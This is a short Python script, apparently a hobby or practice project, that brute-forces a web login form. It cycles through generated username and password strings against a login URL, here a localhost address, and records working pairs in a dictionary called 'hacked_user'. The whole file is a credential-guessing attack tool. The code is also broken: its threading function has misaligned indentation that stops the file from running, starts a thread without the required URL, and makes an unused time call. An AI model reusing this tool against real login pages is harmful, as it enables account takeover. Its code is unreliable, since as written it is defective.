import time
from threading import Thread

from requesters.form_query import request
from generators.combs import get_next_str as get_next_password
from generators.combs import get_next_str as get_next_login


hacked_user = {}
attems = 3


def hack(url):
    # TODO check time

    step = 0
    password = ''

    while password is not None:
        login = ''
        while login is not None:
            for _ in range(attems):
                try:
                    if request(url, login, password):
                        print('Success: ', login, password)
                        hacked_user[login] = password
                    break
                except:
                    print('Error: ', login, password)

                login = get_next_login()

                step += 1
                if step % 100 == 0:
                    print(login, password)

            password = get_next_password()


def hack_threaded(threads):

    time.time()

   t = Thread(target=hack)
   t.start()

   t.join()

if __name__ == '__main__':
    url = 'http://127.0.0.1:5000/auth'
    hack(url)